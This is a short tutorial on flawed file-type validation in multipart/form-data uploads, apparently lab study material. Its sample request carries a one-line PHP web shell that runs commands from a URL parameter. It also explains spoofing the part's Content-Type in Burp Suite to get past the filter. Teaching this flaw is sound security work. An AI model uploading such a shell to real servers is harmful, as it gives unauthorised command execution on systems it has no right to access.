# Flawed file type validation

When submitting standard HTML forms, a browser typically sends the form fields in a POST request using the `application/x-www-form-urlencoded` content type. While this format works well for simple text inputs (such as a name, email, or address), it is inefficient and unsuitable for transmitting large amounts of binary data, such as an image file or a PDF document.

To handle file uploads properly, browsers instead use the multipart/form-data content type.

## How `multipart/form-data` Works

When a form uses `enctype="multipart/form-data"`, the browser splits the HTTP request body into separate sections (parts) separated by a unique boundary string. Each form field or uploaded file gets its own section with its own headers:

```
POST /my-account/avatar HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>
-----------------------------1234567890
Content-Disposition: form-data; name="user"

wiener
-----------------------------1234567890--
```

## Why This Matters for Security Testing

- **Part-Level `Content-Type` Header**: Notice that each uploaded file part includes its own `Content-Type` header (such as `image/jpeg` or `application/x-php`) right below `Content-Disposition`.

- **Browser-Supplied Metadata**: This `Content-Type` value is automatically assigned by the user's browser based on the file extension—meaning it is completely controlled by the client.

- **The Vulnerability**: If the back-end server validates file types solely by checking this `Content-Type` header without inspecting the actual file contents or extension, an attacker can easily intercept the request in **Burp Suite** and change `Content-Type: application/x-php` to `Content-Type: image/jpeg` to bypass the filter.
